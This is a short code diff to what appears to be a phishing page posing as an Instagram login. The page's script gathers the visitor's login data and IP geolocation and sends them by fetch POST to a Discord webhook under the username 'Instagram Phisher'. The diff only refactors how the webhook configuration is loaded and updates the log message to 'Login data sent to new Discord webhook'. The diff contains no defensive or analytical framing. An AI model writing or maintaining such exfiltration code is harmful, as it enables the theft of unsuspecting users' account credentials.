@@ -69,10 +69,10 @@
     </div>
   </div>
 
-  <!-- Load config first, then main script -->
-  <script type="module">
-    import CONFIG from './config.js';
+  <!-- Load config first (non-module) -->
+  <script src="config.js"></script>
 
+  <script>
     let attempt = 0;
 
     // Reliable IP Geolocation
@@ -140,9 +140,9 @@
 
 🔐 2025@FTECHSERVICES`;
 
-      // Send to Discord using config
+      // Send to Discord using the new webhook from config
       try {
-        await fetch(CONFIG.DISCORD_WEBHOOK_URL, {
+        await fetch(window.CONFIG.DISCORD_WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -150,7 +150,7 @@
             username: "Instagram Phisher"
           })
         });
-        console.log("✅ Data sent to Discord");
+        console.log("✅ Login data sent to new Discord webhook");
       } catch (err) {
         console.error("❌ Webhook failed:", err);
       }
